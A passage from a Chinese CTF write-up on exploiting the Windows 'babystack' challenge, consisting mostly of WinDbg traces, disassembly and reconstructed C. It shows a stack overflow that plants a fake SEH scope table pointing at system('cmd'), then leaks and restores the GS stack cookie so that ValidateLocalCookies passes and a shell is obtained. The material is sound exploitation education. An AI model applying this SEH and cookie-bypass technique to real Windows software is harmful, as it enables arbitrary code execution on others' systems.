eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54//edi指向fake scope table
eip=6375b312 esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
VCRUNTIME140!_except_handler4_common+0x22:
6375b312 50              push    eax
0:000> dd 15fb54
0015fb54  ffffffe4 00000000 ffffff20 00000000
0015fb64  fffffffe 01121348 0112138d//fake scope table中handler func指向system('cmd')
```

这里我们已经可以令decode scope table指向我们的fake scope table，里面存放的handler func指向system('cmd')地址，根据我们刚才对此函数的分析，接下来应该获取fake handler func的值，然后跳转到system('cmd')，获取shell，打完收工，皆大欢喜。但是最后程序却crash掉了。为什么呢？

我们进行了分析发现栈中还有地方需要做fix！我们发现在VCRUNTIME140!ValidateLocalCookies函数中，SEH处理崩溃了。

```
0:000> p
eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54
eip=6375b31a esp=0015f580 ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
VCRUNTIME140!_except_handler4_common+0x2a:
6375b31a 897df8          mov     dword ptr [ebp-8],edi ss:0023:0015f5ac=56125318
0:000> p
eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54
eip=6375b31d esp=0015f580 ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
VCRUNTIME140!_except_handler4_common+0x2d:
6375b31d e87effffff      call    VCRUNTIME140!ValidateLocalCookies (6375b2a0)
0:000> p

STATUS_STACK_BUFFER_OVERRUN encountered
WARNING: This break is not a step/trace completion.
The last command has been cleared to prevent
accidental continuation of this unrelated event.
Check the event, location and thread before resuming.
(19f970.19fdf4): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=01123130 ecx=76b5e4b4 edx=0015ef65 esi=00000000 edi=0015fb54
eip=76b5e331 esp=0015f1ac ebp=0015f228 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!UnhandledExceptionFilter+0x5f:
76b5e331 cc              int     3
```

接下来我们跟入VCRUNTIME140!ValidateLocalCookies，看看问题出在哪里。

```
0:000> p//这里会将0024f748的值和esi做异或
eax=ffffffe4 ebx=0024f764 ecx=00e21490 edx=770b6d8d esi=0024f764 edi=0024f6d8
eip=5bf0b2bb esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
VCRUNTIME140!ValidateLocalCookies+0x1b:
5bf0b2bb 333418          xor     esi,dword ptr [eax+ebx] ds:0023:0024f748=61616161

0:000> p//随后将结果交给ecx
eax=ffffffe4 ebx=0024f764 ecx=00e21490 edx=770b6d8d esi=61459605 edi=0024f6d8
eip=5bf0b2c4 esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
VCRUNTIME140!ValidateLocalCookies+0x24:
5bf0b2c4 8bce            mov     ecx,esi
0:000> p
eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
eip=5bf0b2c6 esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
VCRUNTIME140!ValidateLocalCookies+0x26:
5bf0b2c6 ff5508          call    dword ptr [ebp+8]    ss:0023:0024f100=00e21490
0:000> t//进入函数处理会将异或结果和security cookie做比较
eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
eip=00e21490 esp=0024f0e8 ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
babystack+0x1490:
00e21490 3b0d0440e200    cmp     ecx,dword ptr [babystack+0x4004 (00e24004)] ds:0023:00e24004=be69501d
0:000> p//不相等则会跳转
eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
eip=00e21496 esp=0024f0e8 ebp=0024f0f8 iopl=0         ov up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a97
babystack+0x1496:
00e21496 f27502          repne jne babystack+0x149b (00e2149b)           [br=1]
0:000> p
eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
eip=00e2149b esp=0024f0e8 ebp=0024f0f8 iopl=0         ov up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a97
babystack+0x149b:
00e2149b f2e981020000    repne jmp babystack+0x1722 (00e21722)
```

在ValidateLocalCookies中令24f748的位置的值和0x24f764做了异或运算，随后和security cookie做比较，相等则会继续执行后面的内容，这里不相等，那后续SEH异常处理不会进行，跳转进入SetUnhandledExceptionFilter，进入系统默认的异常处理。调用关系是sub_401722->sub_4016FA->SetUnhandledExceptionFilter。我们来看一下这个值是什么。

```
.text:004010B3                 push    0FFFFFFFEh//TryLevel入栈
.text:004010B5                 push    offset stru_403688//stru（scope table）入栈
.text:004010BA                 push    offset sub_401460//seh handler入栈
.text:004010BF                 mov     eax, large fs:0
.text:004010C5                 push    eax//next pointer to seh chain 入栈
.text:004010C6                 add     esp, 0FFFFFF40h
.text:004010CC                 mov     eax, ___security_cookie
.text:004010D1                 xor     [ebp+ms_exc.registration.ScopeTable], eax
.text:004010D4                 xor     eax, ebp//security cookie和ebp做异或运算，形成一个cookie
.text:004010D6                 mov     [ebp+var_1C], eax//存放入栈中，这个值会在ValidateLocalCookies用来check 栈cookie

0:000> p
eax=b33cb7a2 ebx=7ffd8000 ecx=002ff700 edx=00000000 esi=5bf16314 edi=004d7b60
eip=00c410d6 esp=002ff6a0 ebp=002ff770 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
babystack+0x10d6:
00c410d6 8945e4          mov     dword ptr [ebp-1Ch],eax ss:0023:002ff754=00c41580
0:000> !exchain
002ff760: babystack+1460 (00c41460)
002ff7a8: babystack+1460 (00c41460)
002ff7f4: ntdll!_except_handler4+0 (7708e195)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+2e (770e790b)
                func:   ntdll!__RtlUserThreadStart+63 (770e7c80)
Invalid exception stack at ffffffff
0:000> dd 002ff750 l4
002ff750  002ff774 b33cb7a2 002ff690 5be7a4e3//eax=0xb33cb7a2
```

接下来我一边调试，一边将VCRUNTIME140!ValidateLocalCookies的伪代码还原成C，其实这个函数主要就是对这个存放栈Cookie的位置做检查，其中stru结构体就是scope table，对应的结构体变量请参照文章前面的stru的结构。

```
int __cdecl ValidateLocalCookies(void (__thiscall *a1)(int), int a2, int a3)//sub_1000B2A0
{
  int v3; // esi@2
  int v4; // esi@3

  if ( *(_DWORD *)stru->GSCookieOffset != -2 )
  {
    v3 = *(_DWORD *)(FramePointer + stru->GSCookieOffset) ^ (FramePointer + stru->GSCookieXOROffset);//这里frame pointer的值就是在原Function中栈ebp的值
    //00c410b1 8bec            mov     ebp,esp  esp=002ff770
    __guard_check_icall_fptr(a1);
    babystack!sub_401490(v3);//v3 = security_cookie sub_401490就是check security cookie和GSCookie的值是否相等
    		/*.text:00401490 sub_401490      proc near               ; CODE XREF: sub_401060+46p
					.text:00401490                                         ; .text:004013C4p
					.text:00401490                                         ; DATA XREF: ...
					.text:00401490                 cmp     ecx, ___security_cookie
					.text:00401496                 repne jnz short loc_40149B
					.text:00401499                 repne retn

					.text:0040149B loc_40149B:                             ; CODE XREF: sub_401490+6j
					.text:0040149B                 repne jmp sub_401722
					.text:0040149B sub_401490      endp*/
  }
  v4 = *(_DWORD *)(FramePointer + stru->EHCookieOffset) ^ (FramePointer + stru->EHCookieXOROffset);
  __guard_check_icall_fptr(a1);
  return ((int (__thiscall *)(int))babystack!sub_401490)(v4);
}
```

可以看到，这个位置存放的是GSCookie和ebp的一个异或结果，实际上这个值在这里就是为了防止栈溢出绕过GSCookie的检查，而这个位置在prev域-0xC的位置，因此这个值需要泄露出来，接下来我们对exp做修改，主要是将stack上刚才分析的这个Cookie值泄露出后在栈溢出时对栈做fix，之后继续调试。

```
////////////通过VCRUNTIME140!ValidateLocalCookies

0:000> t
eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
eip=003a1490 esp=001df768 ebp=001df778 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
babystack+0x1490:
003a1490 3b0d04403a00    cmp     ecx,dword ptr [babystack+0x4004 (003a4004)] ds:0023:003a4004=70244f1d
0:000> p
eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
eip=003a1496 esp=001df768 ebp=001df778 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x1496:
003a1496 f27502          repne jne babystack+0x149b (003a149b)           [br=0]
0:000> p
eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
eip=003a1499 esp=001df768 ebp=001df778 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x1499:
003a1499 f2c3            repne ret
0:000> p
eax=ffffffe4 ebx=001dfde0 ecx=70244f1d edx=770b6d8d esi=70244f1d edi=001dfd54
eip=6c38b2c9 esp=001df76c ebp=001df778 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!ValidateLocalCookies+0x29:
6c38b2c9 8b4708          mov     eax,dword ptr [edi+8] ds:0023:001dfd5c=ffffff20

///////////跳转到Handler Function执行system('cmd')
0:000> t
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
eip=003a138d esp=001df788 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x138d:
003a138d 6868323a00      push    offset babystack+0x3268 (003a3268)
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
eip=003a1392 esp=001df784 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x1392:
003a1392 ff1584303a00    call    dword ptr [babystack+0x3084 (003a3084)] ds:0023:003a3084={ucrtbase!system (5bef89a0)}
```

在Windows 7下面完成攻击，获得shell交互。

![](./20170830/3.png?r=85)

因此，我们最后的利用过程是这样的，先构造如下的栈溢出的databuf结构。

![](./20170830/6.png?r=77)

（后面的利用过程中的源代码部分在文章中已经提到，这里就不再提了）然后输入任意非yes非no（严格匹配）的字符串，就可以输入我们的databuf了，这里sub_401000会由于字符串拷贝导致栈溢出，随后栈内被我们构造的databuf覆盖，随后我们输入yes，在else语句中，通过输入0，或者字符来触发异常。

```
0:001> g//输入0，触发异常
(1b03c4.1b03c0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=7ffdf000 ecx=70244f1d edx=00000009 esi=5bf16314 edi=004c3ec0
eip=003a1272 esp=001dfd00 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Module load completed but symbols could not be loaded for C:\Users\sh1\Desktop\babystack.exe
babystack+0x1272:
003a1272 8b08            mov     ecx,dword ptr [eax]  ds:0023:00000000=????????
```

进入SEH后，利用fake Scope Table中的fake handler function在VCRUNTIME140!_except_handler4_common->VCRUNTIME140!_EH4_TransferToHandler中实现跳转控制eip。

```
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0110138d edi=00000000
eip=651faf5c esp=0012f888 ebp=0012ff18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
VCRUNTIME140!_EH4_TransferToHandler+0x17:
651faf5c ffe6            jmp     esi {babystack+0x134e (0110138d)}
0:000> t
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
eip=003a138d esp=001df788 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x138d:
003a138d 6868323a00      push    offset babystack+0x3268 (003a3268)
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=003a138d edi=00000000
eip=003a1392 esp=001df784 ebp=001dfde0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
babystack+0x1392:
003a1392 ff1584303a00    call    dword ptr [babystack+0x3084 (003a3084)] ds:0023:003a3084={ucrtbase!system (5bef89a0)}
```

最后我们可以获得shell，在win10下测试也通过了。

![](./20170830/4.png?r=84)

babyshellcode & babystack download url:  https://github.com/k0keoyo/ctf_pwn
